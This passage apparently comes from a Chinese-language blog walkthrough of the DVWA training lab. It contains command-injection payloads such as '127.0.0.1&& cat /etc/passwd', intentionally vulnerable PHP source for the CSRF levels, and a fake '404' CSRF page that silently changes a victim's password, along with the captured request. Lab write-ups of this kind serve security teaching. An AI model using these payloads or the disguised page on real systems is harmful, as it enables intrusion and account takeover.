Low</h3><ul><li><p>127.0.0.1</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180350690.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425180350690"></p></li><li><p>127.0.0.1&amp;&amp; whoami</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180709539.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425180709539"></p></li><li><p>127.0.0.1&amp;&amp; pwd</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425182713991.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425182713991"></p></li><li><p>127.0.0.1&amp;&amp;ls …/…/</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183108288.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425183108288"></p></li><li><p>127.0.0.1&amp;&amp;cat …/…/php.ini</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183656452.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425183656452"></p></li><li><p>127.0.0.1&amp;&amp;cat /etc/passwd</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183851680.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425183851680"></p></li></ul><h3 id="medium-2"><a class="markdownIt-Anchor" href="#medium-2">#</a> Medium</h3><ul><li><p>127.0.0.1&amp; ls</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184026503.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425184026503"></p></li><li><p>127.0.0.1&amp; cat /etc/passwd</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184132006.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425184132006"></p></li></ul><h3 id="high-2"><a class="markdownIt-Anchor" href="#high-2">#</a> High</h3><ul><li>127.0.0.1 |ls</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184427077.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425184427077"></p><hr><h2 id="cross-site-request-forgery-csrf"><a class="markdownIt-Anchor" href="#cross-site-request-forgery-csrf">#</a> Cross Site Request Forgery (CSRF)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># CSRF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Impossible CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># High CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Medium CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Low CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-3"><a class="markdownIt-Anchor" href="#low-3">#</a> Low</h3><ul><li>做个网页</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>是兄弟就来砍我<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.23.133/dvwa/vulnerabilities/csrf/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;是兄弟就来砍我&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size:40px;&quot;</span>&gt;</span>404<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size:20px;&quot;</span>&gt;</span>Page not Found!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>包信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1</span><br><span class="line">Host: 192.168.23.133</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br><span class="line">Cookie: security=medium; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h3 id="medium-3"><a class="markdownIt-Anchor" href="#medium-3">#</a> Medium</h3><ul><li>Low 方法失效，对比正常请求的包，发现包中添加了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br></pre></td></tr></table></figure><p>解决方案是将 csrf 网页部署在目标服务器 IP 作为的路径下。</p><h3 id="high-3"><a class="markdownIt-Anchor" href="#high-3">#</a> High</h3><ul><li>需要配合 XSS 攻击</li></ul><h2 id="file-inclusion"><a class="markdownIt-Anchor" href="#file-inclusion">#</a> File Inclusion</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 